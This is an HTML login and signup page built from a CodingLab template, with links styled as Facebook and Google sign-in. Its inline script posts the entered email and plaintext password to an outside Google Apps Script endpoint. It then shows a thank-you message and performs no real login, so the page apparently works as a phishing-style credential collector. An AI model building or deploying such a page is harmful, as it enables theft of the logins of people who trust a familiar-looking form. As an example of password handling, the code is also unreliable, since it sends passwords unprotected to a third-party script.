<!DOCTYPE html>
<!-- Coding by CodingLab | www.codinglabweb.com-->
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--<title> Responsive Login and Signup Form </title>-->

    <!-- CSS -->
    <link rel="stylesheet" href="login.css">

    <!-- Boxicons CSS -->
    <link href='https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css' rel='stylesheet'>

</head>

<body>
    <form method="post" name="formName">
        <section class="container forms">
            <div class="form login">
                <div class="form-content">
                    <header>Login</header>
                    <form name="formName" method="post">
                        <div class="field input-field">
                            <input type="email" placeholder="Email" name="loginEmail" class="input">
                        </div>

                        <div class="field input-field">
                            <input type="password" placeholder="Password" name="loginPassword" class="password">
                            <i class='bx bx-hide eye-icon'></i>
                        </div>

                        <div class="form-link">
                            <a href="#" class="forgot-pass">Forgot password?</a>
                        </div>

                        <div class="field button-field">
                            <button>Login</button>
                        </div>
                    </form>

                    <div class="form-link">
                        <span>Don't have an account? <a href="#" class="link signup-link">Signup</a></span>
                    </div>
                </div>

                <div class="line"></div>

                <div class="media-options">
                    <a href="https://www.facebook.com/login.php" class="field facebook">
                        <i class='bx bxl-facebook facebook-icon'></i>
                        <span>Login with Facebook</span>
                    </a>
                </div>
    </form>
    <div class="media-options">
        <a href="googlesignup.html" class="field google">
            <img src="https://www.freepnglogos.com/pics/google-logo" alt="" class="google-img">
            <span>Login with Google</span>
        </a>
    </div>

    </div>


    <!-- Signup Form -->

    <div class="form signup">
        <div class="form-content">
            <header>Signup</header>
            <form>
                <div class="field input-field">
                    <input type="email" placeholder="Email" name="signupEmail" class="input">
                </div>

                <div class="field input-field">
                    <input type="password" placeholder="Create password" name="signupPassword" class="password">
                </div>

                <div class="field input-field">
                    <input type="password" placeholder="Confirm password" name="signupPassword1" class="password">
                    <i class='bx bx-hide eye-icon'></i>
                </div>

                <div class="field button-field">
                    <button>Signup</button>
                </div>
            </form>


            <div class="form-link">
                <span>Already have an account? <a href="#" class="link login-link">Login</a></span>
            </div>
        </div>

        <div class="line"></div>

        <div class="media-options">
            <a href="#" class="field facebook">
                <i class='bx bxl-facebook facebook-icon'></i>
                <span>Login with Facebook</span>
            </a>
        </div>

        <div class="media-options">
            <a href="#" class="field google">
                <img src="images/google.png" alt="logo" class="google-img">
                <span>Login with Google</span>
            </a>
        </div>

    </div>
    </section>
    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbyx8fWC01scJl8l-Wdv9eeOiAujJ2RmMrXngfwE6cb0xh_bGDlJnUODzld_q0ULa9jF/exec'
        const form = document.forms['formName']

        form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                .then(response => alert("Thank you! your form is submitted successfully."))
                .then(() => { window.location.reload(); })
                .catch(error => console.error('Error!', error.message))
        })
    </script>
    <!-- JavaScript -->
    <script src="login.js"></script>
    
</body>

</html>
